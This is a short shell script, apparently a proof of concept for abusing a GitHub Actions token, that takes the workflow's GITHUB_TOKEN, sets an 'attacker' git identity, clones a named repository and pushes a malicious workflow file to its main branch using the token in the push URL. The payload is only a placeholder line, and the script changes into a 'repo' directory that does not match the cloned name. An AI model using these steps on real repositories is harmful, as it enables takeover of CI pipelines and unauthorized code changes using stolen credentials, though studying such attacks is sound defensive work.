# Extract the repo token
TOKEN=$GITHUB_TOKEN
# Modify workflow to run their code on main
git config --global user.email "attacker@example.com"
git config --global user.name "attacker"
git clone https://github.com/shreyapohekar/my-dranet.git
cd repo
echo 'malicious code' > .github/workflows/pwn.yml
git add .github/workflows/pwn.yml
git commit -m "Add malicious workflow"
git push https://$TOKEN@github.com/shreyapohekar/my-dranet.git main
